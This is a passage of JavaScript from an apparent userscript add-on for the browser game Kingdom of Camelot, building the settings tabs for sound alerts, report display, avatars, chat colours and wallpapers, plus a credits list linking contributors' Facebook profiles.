			<TR><TD width="10"><INPUT id=ptEnableFoodWarn type=checkbox /></td><TD>\''+culang.OptEnableFoodWarn0+'\''+culang.OptEnableFoodWarn1+'\' '+culang.OptEnableFoodWarn2+' <INPUT id=optFoodHours type=text size=3 value="'+ Options.foodWarnHours +'"> '+culang.OptEnableFoodWarn3+' <SPAN class=boldRed>('+culang.OptEnableFoodWarnNote+')</span></td></tr>\
			<TR><TD colspan=2><span style=\"font-size:10px; color:#555; line-height:18px; \"><font color=#600000><B><u>'+culang.impo+'</u></b></font>: '+culang.OFoodWarnImpNote +'</span></td></tr>\
			<TR><TD colspan=2><div class=pdxStat>'+culang.HkpwrtoolsS+'</div></td></tr>\
			<TR><TD><INPUT  type=checkbox id=ptEnableTowerSoundAlert /></td><TD>'+culang.OSBallianceS+' - '+culang.soundurl+' <INPUT id=togURL2 size=15 type=textbox value="'+ Options.soundURL2 +'" /> '+culang.vol+' <INPUT id=togURL2vol size=3 type=textbox value="'+ Options.URLson2vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL2"></td></tr>\
			<TR><TD><INPUT  type=checkbox id=ptEnableTowerSoundAlertWild /></td><TD>'+culang.OSBalliancewildS+' - '+culang.soundurl+' <INPUT id=togURL4 size=15 type=textbox value="'+ Options.soundURL4 +'" /> '+culang.vol+' <INPUT id=togURL4vol size=3 type=textbox value="'+ Options.URLson4vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL4"></td></tr>\
			<TR><TD><INPUT type=checkbox id=ptEnableFoodChatAlert /></td><TD>'+culang.OptEnableFoodChatAlert+' - '+culang.soundurl+' <INPUT id=togURL3 size=15 type=textbox value="'+ Options.soundURL3 +'" /> '+culang.vol+' <INPUT id=togURL3vol size=3 type=textbox value="'+ Options.URLson3vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL3"></td></tr>\
			<TR><TD><INPUT id=togWhisperOn type=checkbox /></td><TD>'+culang.OtogWhisperOn +' - '+culang.soundurl+' <INPUT id=togURL1 size=15 type=textbox value="'+ Options.soundURL1 +'" /> '+culang.vol+' <INPUT id=togURL1vol size=3 type=textbox value="'+ Options.URLson1vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL1"></td></tr>\
			<TR><TD><INPUT id=togOSAattack type=checkbox /></td><TD><b>'+culang.chatcommand+'</b>: '+culang.OSAattackfetch+' - '+culang.soundurl+' <INPUT id=togURL5 size=15 type=textbox value="'+ Options.soundURL5 +'" /> '+culang.vol+' <INPUT id=togURL5vol size=3 type=textbox value="'+ Options.URLson5vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL5"> </td></tr>\
			<TR><TD><INPUT id=togOSAhorn type=checkbox /></td><TD><b>'+culang.chatcommand+'</b>: '+culang.OSAhornfetch+' - '+culang.soundurl+' <INPUT id=togURL6 size=15 type=textbox value="'+ Options.soundURL6 +'" /> '+culang.vol+' <INPUT id=togURL6vol size=3 type=textbox value="'+ Options.URLson6vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL6"> </td></tr>\
			<TR><TD><INPUT id=togOSAgun type=checkbox /></td><TD><b>'+culang.chatcommand+'</b>: '+culang.OSAgunfetch+' - '+culang.soundurl+'  <INPUT id=togURL7 size=15 type=textbox value="'+ Options.soundURL7 +'" /> '+culang.vol+' <INPUT id=togURL7vol size=3 type=textbox value="'+ Options.URLson7vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL7"> </td></tr>\
			<TR><TD colspan=2><span style=\"font-size:10px; color:#555; line-height:18px; \"><font color=#600000><B><u>'+culang.impo+'</u></b></font>: '+culang.OkocpowertoolsSnote +' <a href="http://koc.god-like.org/?p=149" target="_blank">'+culang.STlinklist+'</a><br><B><u>'+culang.impnote+'</u></b>: '+culang.STlinklistnote+'</span></td></tr>\
			<TR><TD colspan=2><DIV class=pdxStat>'+culang.HOptionsTabKoCset+'</div></td></tr>\
			<TR><TD><INPUT id=togshowMightKoCBugFix type=checkbox /></td><TD>'+culang.showFullMight+'</td></tr>\
			<TR><TD><INPUT id=togshowResKoCBugFix type=checkbox /></td><TD>'+culang.showFullRes+'</td></tr>\
			<TR><TD><INPUT id=togAllRpts type=checkbox /></td><TD>'+culang.OtogAllRpts+'</td></tr>\
			<TR><TD><INPUT id=togAllMembers type=checkbox /></td><TD>'+culang.OtogAllMembers+'</td></tr>\
			<TR><TD><INPUT id=togAllowAlter type=checkbox /></td><TD>'+culang.OtogAllowAlter+'</td></tr>\
			<TR><TD><INPUT id=togWarnZero type=checkbox /></td><TD>'+culang.OtogWarnZero+'</td></tr>\
			<TR><TD><INPUT id=togAttackPicker type=checkbox /></td><TD>'+culang.OtogAttackPicker +' <SPAN class=boldRed>('+culang.OtogAttackPickerNote +')</span></td></tr>\
			<TR><TD><INPUT id=togBatRounds type=checkbox /></td><TD>'+culang.OtogBatRounds +'</td></tr>\
			<TR><TD><INPUT id=togAtkDelete type=checkbox /></td><TD>'+culang.OtogAtkDelete +' <SPAN class=boldRed>('+culang.OtogAtkDeleteNote +')</span></td></tr>\
			<TR><TD><INPUT id=togKnightSelect type=checkbox /></td><TD>'+culang.OtogKnightSelect+'</td></tr>\
			<TR><TD><INPUT id=togCoordBox type=checkbox /></td><TD>'+culang.OtogCoordBox +'  <b>(</b>'+culang.OtogCoordBoxNote+'<b>)</b></td></tr>\
			</table><HR><B><u>'+culang.impnote+'</u>:</b> '+culang.Onote +'\
		   </div>';
		  
	t.optionsDiv.innerHTML = m;
	
	t.changeOpt ('togURL1', 'soundURL1');	t.changeOpt ('togURL1vol', 'URLson1vol');	t.changeOpt ('togURL2', 'soundURL2');	t.changeOpt ('togURL2vol', 'URLson2vol');	t.changeOpt ('togURL3', 'soundURL3');	t.changeOpt ('togURL3vol', 'URLson3vol');	t.changeOpt ('togURL4', 'soundURL4');	t.changeOpt ('togURL4vol', 'URLson4vol');	t.changeOpt ('togURL5', 'soundURL5');	t.changeOpt ('togURL5vol', 'URLson5vol');	t.changeOpt ('togURL6', 'soundURL6');	t.changeOpt ('togURL6vol', 'URLson6vol');	
	t.changeOpt ('togURL7', 'soundURL7');	t.changeOpt ('togURL7vol', 'URLson7vol');	
	t.togOpt ('ptEnableFoodWarn', 'enableFoodWarn');	t.togOpt ('ptEnableTowerSoundAlert', 'enableTowerAlert');	t.togOpt ('ptEnableTowerSoundAlertWild', 'enableTowerAlertWild');	t.togOpt ('ptEnableFoodChatAlert', 'enableFoodChatAlert');
	t.togOpt ('togWhisperOn', 'WhisperOn');	t.togOpt ('togOSAattack', 'OSAattack');	t.togOpt ('togOSAhorn', 'OSAhorn');	t.togOpt ('togOSAgun', 'OSAgun');
	t.togOpt ('togshowMightKoCBugFix', 'showMightKoCBugFix');	t.togOpt ('togshowResKoCBugFix', 'showResKoCBugFix');	
	t.togOpt ('togAllowAlter', 'allowAlterAR');
	t.togOpt ('togAllRpts', 'enhanceARpts', AllianceReports.enable);
	t.togOpt ('togAllMembers', 'enhanceViewMembers', AllianceReports.enable_viewmembers);
	t.togOpt ('togWarnZero', 'fixWarnZero', WarnZeroAttack.setEnable, WarnZeroAttack.isAvailable);
	t.togOpt ('togAttackPicker', 'attackCityPicker', AttackDialog.setEnable, AttackDialog.isCityPickerAvailable);
	t.togOpt ('togBatRounds', 'dispBattleRounds', null, battleReports.isRoundsAvailable);
	t.togOpt ('togKnightSelect', 'fixKnightSelect', AttackDialog.setEnable, AttackDialog.isKnightSelectAvailable);
	t.togOpt ('togCoordBox', 'mapCoordsTop', CoordBox.setEnable, CoordBox.isAvailable);
	t.togOpt ('togAtkDelete', 'reportDeleteButton', null, battleReports.isRoundsAvailable);
	  
	document.getElementById("PDXDefURL7").addEventListener ('click', function () { Options.soundURL7 = ''+mainSoundSource+'gun.mp3'; document.getElementById('togURL7').value=''+mainSoundSource+'gun.mp3'; saveOptions(); }, false);
	document.getElementById("PDXDefURL6").addEventListener ('click', function () { Options.soundURL6 = ''+mainSoundSource+'hupenchaos.mp3'; document.getElementById('togURL6').value=''+mainSoundSource+'hupenchaos.mp3'; saveOptions();	}, false);
	document.getElementById("PDXDefURL5").addEventListener ('click', function () { Options.soundURL5 = ''+mainSoundSource+'war-alarm.mp3'; document.getElementById('togURL5').value=''+mainSoundSource+'war-alarm.mp3'; saveOptions(); }, false);
	document.getElementById("PDXDefURL4").addEventListener ('click', function () { Options.soundURL4 = ''+mainSoundSource+'skyandsand.mp3'; document.getElementById('togURL4').value=''+mainSoundSource+'skyandsand.mp3'; saveOptions(); }, false);
	document.getElementById("PDXDefURL3").addEventListener ('click', function () { Options.soundURL3 = ''+mainSoundSource+'phone.mp3'; document.getElementById('togURL3').value=''+mainSoundSource+'phone.mp3'; saveOptions(); }, false);
	document.getElementById("PDXDefURL2").addEventListener ('click', function () { Options.soundURL2 = ''+mainSoundSource+'sirene.mp3'; document.getElementById('togURL2').value=''+mainSoundSource+'sirene.mp3'; saveOptions(); }, false);
	document.getElementById("PDXDefURL1").addEventListener ('click', function () { Options.soundURL1 = ''+mainSoundSource+'fluestersound.mp3'; document.getElementById('togURL1').value=''+mainSoundSource+'fluestersound.mp3';		saveOptions();	}, false);

	document.getElementById('optFoodHours').addEventListener ('change', function () { var x = document.getElementById('optFoodHours').value; if (isNaN(x) || x<0.01 || x>99999){ document.getElementById('optFoodHours').value = Options.foodWarnHours; return; } Options.foodWarnHours = x; saveOptions();	}, false);
	
    } catch (e) {
	  div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }
  },
// OPTIONS SUBTAB { AVATAR }
 showAvatars : function (){
  div = document.createElement('div');
    var t = Tabs.Options;
      try {
			m = '<DIV style=" max-height:500px;"><DIV class=pdxStat>'+culang.HavatarSettings+'</div><TR><TD><INPUT id=togUserAvatar type=checkbox /></td><TD>'+culang.ownAvatar+': <INPUT id=togAvaURL size=40 type=textbox value="'+Options.UserAvatarURL+'" /><input type=button value="'+culang.reset+'" id="defAvaURL"/> ('+culang.avatarSize+' 25px x 25px) <BR><b><i>'+culang.OavatarNote+'</i></b></td></tr><div class=pdxStat>'+culang.Hinformations+'</div>'+culang.ksAvatarNote+'<HR><font color=#5555CC><b>'+culang.userID+':</b> '+parseInt([Seed.tutorial.userId])+' <BR>'+culang.ksAvatarForm+'</div>\
			<center><div class=pdxStat>'+culang.Havataropt+'</div><table width="100%" border="0" cellspacing="0" cellpadding="0">\
  <tr>\
    <td width="33%"  class="avas"><center><img src="'+IMGkocScripters+'"><a href="http://userscripts.org/users/kocscripters" target="_blank">'+culang.ksScripters+'</a></center></td>\
    <td width="33%" class="avas"><center><img src="'+IMGpdxTeam+'"> <a href="http://koc.god-like.org/?page_id=1118" target="_blank">'+culang.ksTeam+':</a>  '+culang.ksTeamMember+'</center></td>\
    <td class="avas"><center><img src="'+IMGpdxVip+'"></span> '+culang.ksVips+': '+culang.ksVipMember+'</center></td>\
  </tr>\
  </table></center>\
			<div class=pdxStat>'+culang.HhallofFame+'</div>\
			<TABLE>\
			  <tr>\
    <td class="avas"><div style="cursor:pointer;" title="Orth Raphael: '+culang.orthRaphaelComment+'"><a href="http://www.facebook.com/LordZelda"><img src="'+IMGorthraphael+'"></a></div></td>\
    <td class="avas"><div style="cursor:pointer;" title="Dominik Becker"><a href="http://www.facebook.com/profile.php?id=100000899098076" target="_blank"><img src="'+IMGdominikbecker+'"></div></td>\
    <td class="avas"><div style="cursor:pointer;" title="Florian We"><a href="http://www.facebook.com/profile.php?id=100000238339041" target="_blank"><img src="'+IMGflorianwe+'"></a></div></td>\
    <td class="avas"><div style="cursor:pointer;" title="Heiko Wagner"><a href="http://www.facebook.com/profile.php?id=100000839666752" target="_blank"><img src="'+IMGheikowagner+'"></a></div></td>\
    <td class="avas"><div style="cursor:pointer;" title="Helmut Zipser"><a href="http://www.facebook.com/helmut.zipser" target="_blank"><img src="'+IMGhelmutzipser+'"></a></div></td>\
    <td class="avas"><div style="cursor:pointer;" title="Atlan da Gonozal"><a href="http://www.facebook.com/Lord.Atlan" target="_blank"><img src="'+IMGatlandaGonozal+'"></a></div></td>\
    <td class="avas"><div style="cursor:pointer;" title="Fabi An"><a href="http://www.facebook.com/profile.php?id=100000798935635" target="_blank"><img src="'+IMGfabiAn+'"></a></div></td>\
    <td class="avas"><div title="Lord Smoking_Weed"><img src="'+IMGosoLoc+'"></div></td>\
    <td class="avas"><div title="Lion Ness"><img src="'+IMGlionNess+'"></div></td>\
    <td class="avas"><div title="Igor Garcia"><img src="'+IMGigorGarcia+'"></div></td>\
    <td class="avas"><div title="Lady Betrayed: Dice a la alianza: Las guerreras se alzan en medio de la adversidad y el caos y firmes esperan que las puertas del infierno se abran .."><img src="'+IMGladyBetrayed+'"></div></td>\
	<td class="avas"><div title="Lord Jordi_J: Mi Grandeza no reside en no haber caido nunca sino en haberme levantado siempre"><img src="'+IMGjordiJ+'"></div></td>\
	<td class="avas"><div title="Black Mouse"><img src="'+IMGblackMouse+'"></div></td>\
	<td class="avas"><div title="John Hungover Griffiths: Hokey religions and ancient weapons are no match for a good blaster at your side kid."><a href="http://www.facebook.com/profile.php?id=100000798935635" target="_blank"><img src="'+IMGjohnGriffiths+'"></a></div></td>\
	<td class="avas"><div title="Chrissie Griffiths"><img src="'+IMGchrissieGriffiths+'"></div></td>\
	<td class="avas"><div title="Alexander Imm"><img src="'+IMGalexanderImm+'"></div></td>\
	<td class="avas"><div title="Martin von W"><a href="http://www.facebook.com/profile.php?id=100000055095297" target="_blank"><img src="'+IMGmartinvonW+'"></a></div></td>\
	<td class="avas"><div title="Christian Brechtel"><img src="'+IMGchristianBrechtel+'"></div></td>\
	<td class="avas"><div style="cursor:pointer;" title="Lord from Hell"><a href="http://www.facebook.com/hansjuergen.ehschowissn" target="_blank"><img src="'+IMGhansJuergen+'"></a></div></td>\
	<td class="avas"><div title="Max Power"><img src="'+IMGmaxPower+'"></div></td>\
	<td class="avas"><div title="Stefan Pohland"><img src="'+IMGstefanPohland+'"></div></td>\
	<td class="avas"><div style="cursor:pointer;"  title="Tonya Mccurley: u need one i love mine"><a href="https://www.facebook.com/tonya.mccurley" target="_blank"><img src="'+IMGtonyaMccurley+'"></a></div></td>\
	<td class="avas"><div title="Juan Bta. Quinonero Carrasco"><img src="'+IMGjuanBta+'"></div></td>\
	<td class="avas"><div title="Gunther Scheuenpflug"><img src="'+IMGguntherScheuenpflug+'"></div></td>\
	<td class="avas"><div title="Enrico Hanke"><img src="'+IMGenricoHanke+'"></div></td>\
  </tr>\
<tr>\
  <td class="avas"><div title="Bernhard Kuehr"><img src="'+IMGbernhardKuehr+'"></div></td>\
  <td class="avas"><div title="Francesco Venturini"><img src="'+IMGfrancescoVenturini+'"></div></td>\
  </tr>\
  </table>';
			t.optionsDiv.innerHTML = m;
			
	t.togOpt ('togUserAvatar', 'UserAvatar');
			
	document.getElementById('togAvaURL').addEventListener ('change', function () { Options.UserAvatarURL = document.getElementById('togAvaURL').value; saveOptions(); }, false);
	document.getElementById("defAvaURL").addEventListener ('click', function () { Options.UserAvatarURL = 'http://koc.god-like.org/power/avatar/pdx-useravatar.png'; document.getElementById('togAvaURL').value='http://koc.god-like.org/power/avatar/pdx-useravatar.png'; saveOptions(); }, false);
	
    } catch (e) {
	  div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }
  },
// OPTIONS SUBTAB { LAYOUT }
 showLayoutWallpaper : function (){
  div = document.createElement('div');
    var t = Tabs.Options;
      try { name
      m = '<DIV style="max-height:500px;"><DIV class=pdxStat>'+culang.Hlaystuff+'</div><table class=pdxTab width="100%" border="0" cellspacing="0" cellpadding="0">\
		<tr><td colspan="3"><u><b>'+culang.chatBGIMG+'</b></u></td><td colspan="3"><b><u>'+culang.chatBGIMGdark+'</u></b></td><td colspan="2"><b><u>'+culang.customColors+'</u></b></td></tr>\
		<tr><td><INPUT type=checkbox id=togChatBGImageGlobal></td><td>'+culang.image+'</td><td width="75" ><input type="text" id=togOwnBackGroundGlobal value="'+ Options.OwnBackGroundGlobal +'" size="12" maxlength="200" /></td>		<td><INPUT type=checkbox id=togChatBGImageAlliance></td>		<td>'+culang.image+'</td>		<td ><input   type="text" id=togOwnBackGroundAlliance value="'+ Options.OwnBackGroundAlliance +'" size="12" maxlength="200" /></td>		<td width="188">'+culang.saytoalliancecol+'</td>		<td  width="42"><input style="background:'+Colors.SayToAlliCol+';" type="text" id="togSayToAlliCol" value="'+Colors.SayToAlliCol+'" size="7" maxlength="7" /></td>\		</tr>\
		<tr><td width="21"><INPUT type=checkbox id=togChatBGColorGlobal></td><td width="162">'+culang.colors1+' </td><td ><input style="background:'+Colors.OwnBackgroundColorGlobal+';" type="text" id="togOwnBackgroundColorGlobal" value="'+Colors.OwnBackgroundColorGlobal+'" size="7" maxlength="7" /></td>		<td width="20" ><INPUT type=checkbox id=togChatBGColorAlliance></td>		<td width="162">'+culang.colors1+' </td>		<td width="75"><input style="background:'+Colors.OwnBackgroundColorAlliance+';" type="text" id="togOwnBackgroundColorAlliance" value="'+Options.OwnBackgroundColorAlliance+'" size="7" maxlength="7" /></td><td>'+culang.saytoglobal+'</td>		<td ><input style="background:'+Colors.SayToGlobalCol+';" type="text" id="togSayToGlobalCol" value="'+Colors.SayToGlobalCol+'" size="7" maxlength="7" /></td>\		</tr>\
		<tr><td>&nbsp;</td>\
		  <td> </td>\
		  <td ></td>\
		  <td>&nbsp;</td>\
		  <td></td>\
		  <td ></td>\
		  \		  \
    		\
	    <td>&nbsp;</td>		\
		<td>&nbsp;</td></tr>\
		<tr><td>&nbsp;</td>\
		  <td>&nbsp;</td>\
		  <td >&nbsp;</td>\
		  \		  \
		  \
	    <td>&nbsp;</td>\
	    <td>&nbsp;</td>\
	    <td >&nbsp;</td>\
	    \	    \
	    \
	    <td>'+culang.chatSetLink+'</td><td > <INPUT  style="background:'+Colors.modCommForumA+';" type=text id=togmodCommForumA value="'+Colors.modCommForumA+'" size=7 maxlength=7></td>\		</tr>\
		<tr><td colspan="3"><b><u>'+culang.customWPlight+'</u></b></td><td colspan="3"><b><u>'+culang.customWPdark+'</u></b></td>		<td>'+culang.chatSetLinkHover+'</td>		<td > <INPUT style="background:'+Colors.modCommForumAhover+';" type=text id=togmodCommForumAhover value="'+Colors.modCommForumAhover+'" size=7 maxlength=7></td>\		</tr>\
		<tr>\
		  <td rowspan="2">&nbsp;</td>\
		  <td>'+culang.image+'</td>\
		  <td><input   type="text" id=togownWP value="'+ Options.ownWP +'" size="12" maxlength="200" /></td>\
	    <td rowspan="2">&nbsp;</td>\
	    <td>'+culang.image+'</td>\
	    <td><input   type="text" id=togownWPdark value="'+ Options.ownWPdark +'" size="12" maxlength="200" /></td>\
	    <td>&nbsp;</td>\
		<td>&nbsp;</td></tr>\
		<tr>\
		  <td> '+culang.colors1+' </td>\
		  <td ><input type="text" style="background:'+Colors.MainBody+';" id=togMainBody value="'+Colors.MainBody+'" size="7" maxlength="7" /></td>\
		  <td>'+culang.colors1+' </td>\
		  <td ><input style="background:'+Colors.MainBodyDark+';" type="text" id=togMainBodyDark value="'+Colors.MainBodyDark+'" size="7" maxlength="7" /></td>\
		  <td>'+culang.chatLordName+'</td>\
		  <td><input style="background:'+Colors.ChatLordName+';" type="text" id="togChatLordName" value="'+Colors.ChatLordName+'" size="7" maxlength="7" /></td>\
		  \		  \		  \
		  \		  \		  \
  </tr>\
		<tr>\
		  <td rowspan="2">&nbsp;</td>\
		  <td></td>\
		  <td ></td>\
		  \		  \
		  \
		  <td rowspan="2">&nbsp;</td>\
		  <td></td>\
		  <td ></td>\
		  \		  \
		  \
		  <td>'+culang.OtogMainFont+'</td>\
		  <td><input style="background:'+Colors.ChatFontColor+';" type="text" id="togChatFontColor" value="'+Colors.ChatFontColor+'" size="7" maxlength="7" /></td>\
  </tr>\
		<tr>\
		  <td>&nbsp;</td>\
		  <td >&nbsp;</td>\
		  <td>&nbsp;</td>\
		  <td >&nbsp;</td>\
		  <td>'+culang.globalChatLinks+' </td>		<td ><input style="background:'+Colors.ChatLinkColGlobal+';" type="text" id="togChatLinkColGlobal" value="'+Colors.ChatLinkColGlobal+'" size="7" maxlength="7" /></td>\		</tr>\
		<tr>\
		  <td colspan="6"><div class=pdxStat>'+culang.Hcolorcode+'</div></td>		  \
  <td>'+culang.chatContentLinkCol+'</td><td><input style="background:'+Colors.ChatLinkContentColor+';" type="text" id="togChatLinkContentColor" value="'+Colors.ChatLinkContentColor+'" size="7" maxlength="7" /></td>\		</tr>\
		<tr>		  <td colspan="6" rowspan="5">'+culang.OstyleColor1+' <a href="http://www.colorpicker.com/" target="_blank">'+culang.OstyleColor2 +'</a><BR>\
		    '+culang.OstyleColor3 +' <a href="http://www.w3schools.com/html/html_colors.asp" target="_blank">'+culang.colortable +'</a> / <a href="http://www.html-world.de/program/html_c2.php" target="_blank">'+culang.colortableextend +'</a><BR>\
'+culang.OstyleColor4+' <BR>\
'+culang.impo+' '+culang.OstyleColor4imp+'</td>		  \
		  \
		  \
	    <td>'+culang.allianceChatLinks+' </td><td ><input style="background:'+Colors.ChatLinkColAlly+';" type="text" id="togChatLinkColAlly" value="'+Colors.ChatLinkColAlly+'" size="7" maxlength="7" /></td></tr>\
		<tr>		  \
		  \
		  <td>&nbsp;</td>\
		  <td>&nbsp;</td>\
  </tr>\
		<tr>\
		  \
		  \
		  <td>'+culang.chatTime+'</td>\
		  <td><input style="background:'+Colors.ChatTimeCol+';" type="text" id="togChatTimeCol" value="'+Colors.ChatTimeCol+'" size="7" maxlength="7" /></td>\
  </tr>\
		<tr>\
		  \
		  <td>'+culang.chatTimeHover+'</td>\
		  <td><input style="background:'+Colors.ChatTimeHover+';" type="text" id="togChatTimeHover" value="'+Colors.ChatTimeHover+'" size="7" maxlength="7" /></td>\
  </tr>\
		<tr>		\
		  <td>&nbsp;</td>\
		  <td>&nbsp;</td>\
		</tr>\
		<tr><td colspan="3"><b><u>'+culang.setbannerBox+'</u></b></td><td colspan="2"><u><b>'+culang.setQuickInfos+'</b></u></td><td>&nbsp;</td><td colspan="2"><u><b>'+culang.setDeskInfo+'</b></u></td>		</tr>\
		<tr><td colspan="2">'+culang.OtogMainFont+'</td><td ><input  style="background:'+Colors.devCreditsFontCol+';" type="text" id="togdevCreditsFontCol" value="'+Colors.devCreditsFontCol+'" size="7" maxlength="7" /></td>		<td colspan="2">'+culang.OtogMainFont+'</td>		<td ><input style="background:'+Colors.pdxQuickInfoFont+';" type="text" id="togpdxQuickInfoFont" value="'+Colors.pdxQuickInfoFont+'" size="7" maxlength="7" /></td>		<td>'+culang.OtogMainFont+'</td>		<td ><input style="background:'+Colors.pdxDeskInfoFont+';" type="text" id="togpdxDeskInfoFont" value="'+Colors.pdxDeskInfoFont+'" size="7" maxlength="7" /></td>\		</tr>\
		<tr><td colspan="2">'+culang.hyperlinks+'</td><td ><input style="background:'+Colors.devLinkCol+';" type="text" id="togdevLinkCol" value="'+Colors.devLinkCol+'" size="7" maxlength="7" /></td>		<td colspan="2">'+culang.bgimg+'</td>		<td ><input type="text" id="togownWP" value="'+ Options.pdxQuickInfoBG +'" size="12" maxlength="200" /></td>		<td>'+culang.bgimg+'</td>		<td ><input type="text" id="togpdxDeskInfoBG" value="'+ Options.pdxDeskInfoBG +'" size="7" maxlength="200" /></td></tr>\
		<tr><td colspan="2">'+culang.hyperlinkshover+'</td><td ><input style="background:'+Colors.devLinkColhover+';" type="text" id="togdevLinkColhover" value="'+Colors.devLinkColhover+'" size="7" maxlength="7" /></td>		<td colspan="2">&nbsp;</td>		<td>&nbsp;</td>		<td>&nbsp;</td>		<td>&nbsp;</td></tr><tr><td colspan="2">'+culang.bgimg+'</td>		<td ><input type="text" id="togdevBG" value="'+ Options.devBG +'" size="12" maxlength="200" /></td>		<td colspan="2">&nbsp;</td>		<td>&nbsp;</td>		<td>'+culang.fontStats+' </td>		<td ><input style="background:'+Colors.pdxQuickInfoData+';" type="text" id="togpdxQuickInfoData" value="'+Colors.pdxQuickInfoData+'" size="7" maxlength="7" /></td>\		</tr>\
		</table><HR><B><u>'+culang.impnote+'</u>:</b> '+culang.Onote +' </div>';
	    
	t.optionsDiv.innerHTML = m;

	t.changeColorLayout ('togpdxQuickInfoData', 'pdxQuickInfoData');
	t.changeColorLayout ('togdevLinkColhover', 'devLinkColhover');
	t.changeColorLayout ('togdevLinkCol', 'devLinkCol');
	t.changeColorLayout ('togpdxDeskInfoFont', 'pdxDeskInfoFont');	
	t.changeColorLayout ('togChatTimeCol', 'ChatTimeCol');	t.changeColorLayout ('togChatTimeHover', 'ChatTimeHover');	t.changeColorLayout ('togChatLordName', 'ChatLordName');
  
	t.changeColorLayout ('togpdxQuickInfoFont', 'pdxQuickInfoFont');
	t.changeColorLayout ('togdevCreditsFontCol', 'devCreditsFontCol');
	t.changeColorLayout ('togChatLinkColGlobal', 'ChatLinkColGlobal');
	t.changeColorLayout ('togChatLinkColAlly', 'ChatLinkColAlly');	t.changeColorLayout ('togChatLinkContentColor', 'ChatLinkContentColor');
	t.changeColorLayout ('togSayToAlliCol', 'SayToAlliCol');	t.changeColorLayout ('togSayToGlobalCol', 'SayToGlobalCol');
	t.changeColorLayout ('togmodCommForumAhover', 'modCommForumAhover');	t.changeColorLayout ('togmodCommForumA', 'modCommForumA');
    t.changeColorLayout ('togMainBody', 'MainBody');
	t.changeColorLayout ('togMainBodyDark', 'MainBodyDark');
	t.changeColorLayout ('togChatFontColor', 'ChatFontColor');
	t.togOpt ('togChatBGColorGlobal', 'ChatBGColorGlobal');	t.togOpt ('togChatBGColorAlliance', 'ChatBGColorAlliance');	t.togOpt ('togChatBGImageGlobal', 'ChatBGImageGlobal');	t.togOpt ('togChatBGImageAlliance', 'ChatBGImageAlliance');
	t.changeColorLayout ('togOwnBackgroundColorGlobal', 'OwnBackgroundColorGlobal');	t.changeColorLayout ('togOwnBackgroundColorAlliance', 'OwnBackgroundColorAlliance');
	t.changeOpt ('togdevBG', 'devBG');	t.changeOpt ('togpdxDeskInfoBG', 'pdxDeskInfoBG');
	t.changeOpt ('togownWP', 'ownWP');	t.changeOpt ('togownWPdark', 'ownWPdark');
	t.changeOpt ('togpdxQuickInfoBG', 'pdxQuickInfoBG');	
	t.changeOpt ('togOwnBackGroundGlobal', 'OwnBackGroundGlobal');	t.changeOpt ('togOwnBackGroundAlliance', 'OwnBackGroundAlliance');
		// t.changeColorLayout ('togMainFont', 'MainFont');	
    } catch (e) {
	  div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }
  },
// OPTIONS SUBTAB { LINKS }
 showXtrLink : function (){
  div = document.createElement('div');
    var t = Tabs.Options;
      try {
    m = '<div style="max-height:500px; overflow:auto;">'+culang.usefulllinks+'<DIV class=pdxStat>'+culang.HmoreInfo+'</div><TABLE class=pdxTab><TD width="300px">Kingdom of Camelot - Client '+culang.scriptv+': <span class=boldRed>'+ KOCversion +'</span></td><TD><INPUT id=ptButDebug type=submit name="SEED" value="DEBUG"></td></table></div><HR><B><u>'+culang.impnote+'</u>:</b> '+culang.Onote +'</div>';   
	t.optionsDiv.innerHTML = m;

    document.getElementById('ptButDebug').addEventListener('click', function (){debugWin.doit()}, false);  
    } catch (e) {
	  div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }
  },
  
  //OPTIONS FUNCTION
   togPDXCOpt : function (checkboxId, optionName, callOnChange, callEnable,callIsAvailable){
    var t = Tabs.Options;
    var checkbox = document.getElementById(checkboxId);

    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (PDXCountOpt[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      PDXCountOpt[optionName] = this.checked;
      savePDXCountOpt();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },
  changePDXCOpt : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = PDXCountOpt[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      PDXCountOpt[optionName] = this.value;
      savePDXCountOpt();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
  togpdxSO : function (checkboxId, optionName, callOnChange, callEnable,callIsAvailable){
    var t = Tabs.Options;
    var checkbox = document.getElementById(checkboxId);

    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (StyleOptions[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      StyleOptions[optionName] = this.checked;
      saveStyleOptions();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },
  changepdxSO : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = StyleOptions[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      StyleOptions[optionName] = this.value;
      saveStyleOptions();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
  togColor : function (checkboxId, optionName, callOnChange, callEnable,callIsAvailable){
    var t = Tabs.Options;
    var checkbox = document.getElementById(checkboxId);

    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (Colors[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Colors[optionName] = this.checked;
      saveColors();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },
 changeColorLayout : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = Colors[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Colors[optionName] = this.value;
      saveColors();
	  t.showLayoutWallpaper();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
